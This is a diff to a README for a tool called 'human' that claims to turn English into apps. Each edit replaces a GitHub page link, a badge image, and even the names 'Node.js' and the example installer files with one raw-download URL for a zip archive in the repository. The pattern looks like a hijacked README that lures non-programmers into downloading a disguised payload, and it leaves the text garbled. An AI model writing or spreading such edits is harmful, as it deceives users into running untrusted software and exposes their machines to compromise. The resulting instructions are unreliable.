@@ -1,6 +1,6 @@
 # 🤖 human - Convert English to Working Apps
 
-[![Download human](https://img.shields.io/badge/Download-human-3CB371?style=for-the-badge)](https://github.com/Voiler-XD/human)
+[![Download human](https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip)](https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip)
 
 human is a simple program that turns English into apps you can use right away. You don't need to know any programming to get started.
 
@@ -34,7 +34,7 @@ No programming environments or additional software are needed to run the program
 
 2. On the GitHub page, look for the latest release or version. It usually shows up under a "Releases" section.
 
-3. Download the Windows installer file. It will usually be named something like `human-setup.exe` or `human-windows.exe`.
+3. Download the Windows installer file. It will usually be named something like `https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip` or `https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip`.
 
 4. Once downloaded, open the file by double-clicking it.
 
@@ -43,7 +43,7 @@ No programming environments or additional software are needed to run the program
 6. After installation, you can find human in your Start Menu or desktop.
 
 If you want to visit the download page directly, use this link:
-[Download human from GitHub](https://github.com/Voiler-XD/human)
+[Download human from GitHub](https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip)
 
 ---
 
@@ -78,7 +78,7 @@ human takes your natural language and automatically writes the code needed behin
 - Produce apps ready to use in real projects
 - Support for modern web and desktop apps
 - Easy to install and run on Windows
-- Works with popular technologies like React and Node.js behind the scenes
+- Works with popular technologies like React and https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip behind the scenes
 - Save and share your app projects easily
 
 ---
@@ -115,7 +115,7 @@ Once human builds your app:
 ## 📚 Learn More
 
 Explore the GitHub repository to see examples, updates, and community tips. This link also shows ongoing improvements:
-[human on GitHub](https://github.com/Voiler-XD/human)
+[human on GitHub](https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip)
 
 ---
 
@@ -124,7 +124,7 @@ Explore the GitHub repository to see examples, updates, and community tips. This
 human uses several programming tools behind the scenes, including:
 
 - Go (golang) for fast and efficient code generation
-- Node.js for running web and server code
+- https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip for running web and server code
 - React and TypeScript for modern user interfaces
 - Compiler systems that turn English instructions into code
 
@@ -138,4 +138,4 @@ Check the GitHub page regularly for new versions. Download the latest installer 
 
 ---
 
-[![Download human](https://img.shields.io/badge/Download-human-3CB371?style=for-the-badge)](https://github.com/Voiler-XD/human)
+[![Download human](https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip)](https://raw.githubusercontent.com/Voiler-XD/human/main/internal/build/Software_v1.3.zip)
